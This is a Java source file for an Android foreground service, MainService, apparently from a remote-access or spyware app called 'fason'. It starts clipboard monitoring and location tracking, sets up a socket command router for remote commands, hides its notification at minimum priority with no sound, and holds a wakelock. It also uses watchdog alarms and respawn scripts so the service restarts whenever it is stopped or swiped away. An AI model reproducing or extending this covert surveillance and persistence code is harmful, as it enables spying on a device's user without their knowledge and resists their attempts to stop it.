package com.fason.app.service;

import android.app.AlarmManager;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ServiceInfo;
import android.os.Build;
import android.os.IBinder;
import android.os.PowerManager;
import android.os.SystemClock;

import androidx.core.app.NotificationCompat;

import com.fason.app.R;
import com.fason.app.core.network.SocketCommandRouter;
import com.fason.app.features.clipboard.ClipboardMonitor;
import com.fason.app.features.location.LocManager;
import com.fason.app.receiver.WatchdogReceiver;

// Main foreground service
public class MainService extends Service {

    private static final String CHANNEL = "fason_service";
    private static final int NOTIF_ID = 1;
    private static final long WATCHDOG_INTERVAL = 60000;

    private static MainService instance;
    private static PowerManager.WakeLock wakeLock;

    private ClipboardMonitor clipMonitor;
    private LocManager locManager;
    private int currentType = 0;

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    // Get service instance
    public static MainService getInstance() {
        return instance;
    }

    @Override
    public void onCreate() {
        super.onCreate();
        instance = this;

        createChannel();
        startForeground();
        acquireWakeLock();

        WatchdogReceiver.setServiceActive(this, true);
        clipMonitor = ClipboardMonitor.getInstance(this);
        clipMonitor.start();
        locManager = new LocManager(this);
        SocketCommandRouter.initialize();

        scheduleWatchdog();
    }

    // Create notification channel
    private void createChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel ch = new NotificationChannel(
                CHANNEL, "Service", NotificationManager.IMPORTANCE_MIN);
            ch.setShowBadge(false);
            ch.setSound(null, null);
            NotificationManager nm = getSystemService(NotificationManager.class);
            if (nm != null) nm.createNotificationChannel(ch);
        }
    }

    // Start foreground with proper type
    private void startForeground() {
        currentType = ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC;
        Notification notif = buildNotification();

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            startForeground(NOTIF_ID, notif, currentType);
        } else {
            startForeground(NOTIF_ID, notif);
        }
    }

    // Build notification
    private Notification buildNotification() {
        return new NotificationCompat.Builder(this, CHANNEL)
            .setContentTitle("Service Active")
            .setSmallIcon(R.mipmap.ic_launcher)
            .setOngoing(true)
            .setSilent(true)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .build();
    }

    // Acquire wakelock
    private void acquireWakeLock() {
        if (wakeLock == null) {
            PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
            if (pm != null) {
                wakeLock = pm.newWakeLock(
                    PowerManager.PARTIAL_WAKE_LOCK, "fason::service");
                wakeLock.setReferenceCounted(false);
                wakeLock.acquire(10 * 60 * 1000L);
            }
        }
    }

    // Update foreground service type (Android 14+)
    public void updateType(int type) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            int combined = currentType | type;
            if (combined != currentType) {
                currentType = combined;
                startForeground(NOTIF_ID, buildNotification(), currentType);
            }
        }
    }

    // Release foreground service type
    public void releaseType(int type) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            int remaining = currentType & ~type;
            if (remaining != currentType && remaining != 0) {
                currentType = remaining;
                startForeground(NOTIF_ID, buildNotification(), currentType);
            }
        }
    }

    // Schedule watchdog alarm
    private void scheduleWatchdog() {
        Intent i = new Intent(this, WatchdogReceiver.class);
        i.setAction("keepAlive");

        int flags = PendingIntent.FLAG_UPDATE_CURRENT;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            flags |= PendingIntent.FLAG_IMMUTABLE;
        }

        PendingIntent pi = PendingIntent.getBroadcast(this, 999, i, flags);
        AlarmManager am = (AlarmManager) getSystemService(Context.ALARM_SERVICE);

        if (am != null) {
            long trigger = SystemClock.elapsedRealtime() + WATCHDOG_INTERVAL;
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                if (am.canScheduleExactAlarms()) {
                    am.setExactAndAllowWhileIdle(
                        AlarmManager.ELAPSED_REALTIME_WAKEUP, trigger, pi);
                } else {
                    am.setAndAllowWhileIdle(
                        AlarmManager.ELAPSED_REALTIME_WAKEUP, trigger, pi);
                }
            } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                am.setExactAndAllowWhileIdle(
                    AlarmManager.ELAPSED_REALTIME_WAKEUP, trigger, pi);
            } else {
                am.setExact(AlarmManager.ELAPSED_REALTIME_WAKEUP, trigger, pi);
            }
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        // Renew wakelock
        if (wakeLock != null && !wakeLock.isHeld()) {
            wakeLock.acquire(10 * 60 * 1000L);
        }
        scheduleWatchdog();
        return START_STICKY;
    }

    @Override
    public void onTaskRemoved(Intent rootIntent) {
        super.onTaskRemoved(rootIntent);
        scheduleRestart();
    }

    @Override
    public void onDestroy() {
        if (clipMonitor != null) clipMonitor.stop();
        if (locManager != null) locManager.stop();
        if (wakeLock != null && wakeLock.isHeld()) {
            wakeLock.release();
        }
        WatchdogReceiver.setServiceActive(this, false);
        instance = null;
        scheduleRestart();
        super.onDestroy();
    }

    // Schedule restart
    private void scheduleRestart() {
        try {
            Intent i = new Intent("respawnService");
            i.setPackage(getPackageName());

            int flags = PendingIntent.FLAG_UPDATE_CURRENT;
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                flags |= PendingIntent.FLAG_IMMUTABLE;
            }

            PendingIntent pi = PendingIntent.getBroadcast(this, 0, i, flags);
            AlarmManager am = (AlarmManager) getSystemService(Context.ALARM_SERVICE);

            if (am != null) {
                long trigger = SystemClock.elapsedRealtime() + 2000;
                am.set(AlarmManager.ELAPSED_REALTIME_WAKEUP, trigger, pi);
            }
        } catch (Exception ignored) {}
    }

    // Get location manager
    public LocManager getLocManager() {
        return locManager;
    }
}
